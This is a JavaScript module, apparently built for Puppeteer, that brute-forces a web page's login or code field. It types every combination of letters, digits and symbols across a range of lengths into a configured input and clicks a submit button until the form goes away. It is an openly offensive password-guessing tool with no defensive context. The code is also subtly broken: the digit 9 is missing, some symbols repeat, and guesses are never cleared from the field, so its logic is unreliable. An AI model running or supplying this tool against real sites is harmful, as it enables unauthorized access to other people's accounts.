const UTILS = require('./utils');

function letters(MAJ = true, NUMBERS = true, SPECIALS = true) {
  const caps = [...Array(26)].map((val, i) => String.fromCharCode(i + 65));
  const numbers = NUMBERS ? [...Array(9)].map((val, i) => String.fromCharCode(i + 48)) : [];
  const capsMAJ = MAJ ? [...Array(26)].map((val, i) => String.fromCharCode(i + 65).toLowerCase()) : [];
  const selectedSpecialCharacters = SPECIALS ? ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '+', '-', '.', '~', '|', '<', '>', '=', '-', '_', '/', ':', ';', '?', '[', ']', '{', '}', '~'] : [];

  return [...caps, ...capsMAJ, ...numbers, ...selectedSpecialCharacters];
}

async function generateNoRecursion(page, len, chars) 
{
    // Indices that indicate what char to use on corresponding place.
    var indices = [];
    for (var i = 0; i < len; ++i)
        indices.push(0);

    // While all indices in set of chars
    while (indices[0] < chars.length)
    {
        if(await page.$(`#${UTILS.IDINPUT}`)) {
            // Print current solution
        var str = "";
        for (var i = 0; i < indices.length; ++i)
            str += chars[indices[i]];
        //console.log(str);
        await page.type(`#${UTILS.IDINPUT}`, str)
        await page.click(`#${UTILS.IDBUTTON}`)

        // Go to next solution by incrementing last index and adjusting
        // if it is out of chars set.
        indices[len-1]++;
        for (var i = len-1; i > 0 && indices[i] == chars.length; --i)
        {
            indices[i] = 0;
            indices[i-1]++;
        }
        } else {
            return;
        }

        
    }
}

async function brute(page, min, max)
{
    for (var l = min; l <= max; ++l)
        await generateNoRecursion(page, l, letters(UTILS.MAJ, UTILS.NUMBERS, UTILS.SPECIALS));
}

module.exports = {
  brute
}